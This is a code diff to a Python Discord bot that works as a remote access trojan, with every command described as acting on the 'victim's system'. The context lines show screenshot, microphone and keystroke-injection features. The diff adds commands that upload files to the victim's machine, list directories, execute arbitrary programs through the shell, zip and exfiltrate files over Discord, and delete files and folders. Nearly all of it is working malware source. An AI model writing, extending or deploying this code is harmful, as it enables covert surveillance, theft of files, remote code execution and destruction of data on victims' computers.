@@ -24,6 +24,7 @@ import sys
 import uuid
 import hashlib
 import tempfile
+import zipfile
 
 TOKEN = "BOT-TOKEN-GOES-HERE"
 
@@ -87,7 +88,7 @@ async def config(ctx, action: str = "", item: str = "", target: str = ""):
         elif target == "" and item != "list":
             await ctx.send(f"Please enter a target (role or channel name to add or remove from allow list)")
             return
-        elif action == 'role':
+        elif action == 'role' or action == 'roles':
             if item == 'add':
                 role = discord.utils.get(ctx.guild.roles, name=target)
                 if not role:
@@ -117,7 +118,7 @@ async def config(ctx, action: str = "", item: str = "", target: str = ""):
                 await ctx.send(f"Allowed roles: {', '.join(role_names)}")
             else:
                 await ctx.send("Invalid action. Use 'add', 'remove', or 'list'.")
-        elif action == 'channel':
+        elif action == 'channel' or action == 'channels':
             if item == 'add':
                 channel = discord.utils.get(ctx.guild.channels, name=target)
                 if channel:
@@ -267,7 +268,7 @@ async def ss(ctx):
         img.save(temp_file, 'PNG')
         await ctx.reply("Command Executed! (Red dot indicates cursor)", file=discord.File(temp_file.name, filename="screenshot.png"))
         
-@bot.command(name="tts", help="Run TTS on victim's computer")
+@bot.command(name="tts", help="Run TTS on victim's system")
 async def tts(ctx, *, text: str):
     global tts_process
     try:
@@ -283,7 +284,7 @@ async def tts(ctx, *, text: str):
         
 tts_process = None
 
-@bot.command(name="ttsurl", help="Run TTS on victim's computer!")
+@bot.command(name="ttsurl", help="Run TTS on victim's system!")
 async def ttsurl(ctx, url: str):
     global tts_process
     try:
@@ -362,14 +363,6 @@ async def listen(ctx):
     thread = Thread(target=recording_thread)
     thread.start()
 
-@bot.command(help="Runs the specified program on the victim's system.")
-async def run(ctx, *, program: str):
-    try:
-        subprocess.Popen(program, shell=True)
-        await ctx.reply("Command Executed!")
-    except Exception as e:
-        await ctx.reply(f"Error executing command: {str(e)}")
-
 @bot.command(help="Types the given text on the victim's system.")
 async def write(ctx, *, text: str):
     try:
@@ -377,6 +370,102 @@ async def write(ctx, *, text: str):
         await ctx.reply("Command Executed!")
     except Exception as e:
         await ctx.reply(f"Error executing command: {str(e)}")
+        
+@bot.command(help="Upload a file to a specific path on victim's system")
+async def upload(ctx, folder: str = None):
+    if not folder:
+        await ctx.reply("Error: No folder path provided. Please specify a folder to upload the file to.")
+        return
+    if not os.path.exists(folder):
+        os.makedirs(folder)
+    if len(ctx.message.attachments) > 0:
+        attachment = ctx.message.attachments[0]
+        file_path = os.path.join(folder, attachment.filename)
+        await attachment.save(file_path)
+        await ctx.reply(f"File `{attachment.filename}` has been saved to '{folder}'.")
+    else:
+        await ctx.reply("Error: No file attached to the message.")
+        
+@bot.command(help="Lists contents of a folder on victim's system")
+async def ls(ctx, path: str = None):
+    if not path:
+        await ctx.reply("Error: No path provided. Please specify a directory path to list.")
+        return
+    if not os.path.exists(path):
+        await ctx.reply(f"Error: The path '{path}' does not exist.")
+        return
+    if not os.path.isdir(path):
+        await ctx.reply(f"Error: The path '{path}' is not a directory.")
+        return
+    items = os.listdir(path)
+    parent_dir = os.path.abspath(os.path.join(path, os.pardir))
+    dirs = sorted([item for item in items if os.path.isdir(os.path.join(path, item))])
+    files = sorted([item for item in items if os.path.isfile(os.path.join(path, item))])
+    response = f"​\n**Parent Directory**: `{parent_dir}`\n\n"
+    if dirs or files:
+        for directory in dirs:
+            dir_full_path = os.path.join(path, directory)
+            response += f"`[DIR]  {directory}: {dir_full_path}`\n"
+        for file in files:
+            file_full_path = os.path.join(path, file)
+            response += f"`[FILE] {file}: {file_full_path}`\n"
+    else:
+        response += "`This directory is empty.`"
+
+    await ctx.reply(f"{response}")
+
+@bot.command(help="Runs a specified program on victim's system")
+async def run(ctx, file_path: str = None):
+    if not file_path:
+        await ctx.reply("Error: No file path provided. Please specify the file path to run.")
+        return
+    if not os.path.exists(file_path):
+        await ctx.reply(f"Error: The file '{file_path}' does not exist.")
+        return
+    try:
+        subprocess.Popen(file_path, shell=True)
+        await ctx.reply(f"File '{file_path}' has been executed.")
+    except Exception as e:
+        await ctx.reply(f"Error: Could not execute the file. {str(e)}")    
+
+@bot.command(help="Zips and downloads a file from victim's system")
+async def download(ctx, file_path: str = None):
+    if not file_path:
+        await ctx.reply("Error: No file path provided. Please specify the file path to download.")
+        return
+    if not os.path.exists(file_path):
+        await ctx.reply(f"Error: The file '{file_path}' does not exist.")
+        return
+    if not os.path.isfile(file_path):
+        await ctx.reply(f"Error: The path '{file_path}' is not a file.")
+        return
+    try:
+        file_ext = os.path.splitext(file_path)[1].lower()
+        if file_ext == '.rar' or file_ext == '.zip':
+            await ctx.reply(file=discord.File(file_path))
+        else:
+            zip_filename = os.path.basename(file_path) + '.zip'
+            zip_path = os.path.join(os.path.dirname(file_path), zip_filename)
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                zipf.write(file_path, os.path.basename(file_path))
+            await ctx.reply(file=discord.File(zip_path))
+            os.remove(zip_path)
+    except Exception as e:
+        await ctx.reply(f"Error: Could not compress and send the file. {str(e)}")
+    
+@bot.command(help="Deletes a folder or file from the victim's system")
+async def delete(ctx, path: str = None):
+    if not path:
+        await ctx.reply("Error: No path provided. Please specify a file or folder path to delete.")
+        return
+    if os.path.isfile(path):
+        os.remove(path)
+        await ctx.reply(f"File '{path}' has been deleted.")
+    elif os.path.isdir(path):
+        shutil.rmtree(path)
+        await ctx.reply(f"Folder '{path}' and all its contents have been deleted.")
+    else:
+        await ctx.reply(f"The path '{path}' does not exist.")
 
 @bot.command(help="Freezes the cursor on the victim's system.")
 async def freezecursor(ctx):
